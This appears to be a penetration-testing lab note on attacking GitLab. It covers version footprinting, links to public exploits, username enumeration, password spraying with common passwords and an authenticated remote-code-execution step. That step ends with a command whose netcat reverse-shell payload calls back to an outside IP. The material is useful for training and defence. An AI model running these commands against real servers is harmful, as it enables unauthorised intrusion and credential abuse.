# gitlab
## info
GitLab is a web-based Git-repository hosting tool that provides wiki capabilities, issue tracking, and continuous integration and deployment pipeline functionality.  
GitLab is similar to GitHub and BitBucket, which are also web-based Git repository tools.  
During internal and external penetration tests, it is common to come across interesting data in a company's GitHub repo or a self-hosted GitLab or BitBucket instance. These Git repositories may just hold publicly available code such as scripts to interact with an API. However, we may also find scripts or configuration files that were accidentally committed containing cleartext secrets such as passwords that we may use to our advantage.  
Applications such as GitLab allow for public repositories (that require no authentication), internal repositories (available to authenticated users), and private repositories (restricted to specific users).  
## discovery and footprinting
We can quickly determine that GitLab is in use in an environment by just browsing to the GitLab URL, and we will be directed to the login page, which displays the GitLab logo.  
The only way to footprint the GitLab version number in use is by browsing to the /help page when logged in.  
If the GitLab instance allows us to register an account, we can log in and browse to this page to confirm the version.  
If we cannot register an account, we may have to try a low-risk exploit such as this: https://www.exploit-db.com/exploits/49821  
We do not recommend launching various exploits at an application, so if we have no way to enumerate the version number (such as a date on the page, the first public commit, or by registering a user), then we should stick to hunting for secrets and not try multiple exploits against it blindly.  
## vulnerable gitlab versions
* 12.9.0 (https://www.exploit-db.com/exploits/48431)
* 11.4.7 (https://www.exploit-db.com/exploits/49257)
* 13.10.3 (https://www.exploit-db.com/exploits/49821)
* 13.9.3 (https://www.exploit-db.com/exploits/49944)
* 13.10.2 (https://www.exploit-db.com/exploits/49951)
## enumeration
There's not much we can do against GitLab without knowing the version number or being logged in.  
The first thing we should try is browsing to /explore and see if there are any public projects that may contain something interesting.  
From here, we can explore each of the pages linked in the top right groups, snippets, and help.  
We can also use the search functionality and see if we can uncover any other projects.  
Once we are done digging through what is available externally, we should check and see if we can register an account and access additional projects.  
We can also use the registration form to enumerate valid users (more on this in the next section). If we can make a list of valid users, we could attempt to guess weak passwords or possibly re-use credentials that we find from a password dump using a tool such as Dehashed  
## attacking gitlab
### username enumeration
https://www.exploit-db.com/exploits/49821  
https://github.com/dpgg101/GitLabUserEnum  
account lockout policy: GitLab's defaults are set to 10 failed attempts resulting in an automatic unlock after 10 minutes.  
If we successfully pulled down a large list of users, we could attempt a controlled password spraying attack with weak, common passwords such as Welcome1 or Password123, etc., or try to re-use credentials gathered from other sources such as password dumps from public data breaches.  
<pre>./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt</pre>
### authenticated RCE
GitLab Community Edition version 13.10.2 and lower  
steps:
* get valid credentials (or register new account if it is allowed and use those credentials)
* use the exploit listed below to create a reverse shell (and setup a listener to get the shell)

https://hackerone.com/reports/1154542  
https://www.exploit-db.com/exploits/49951  
<pre>python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '</pre>
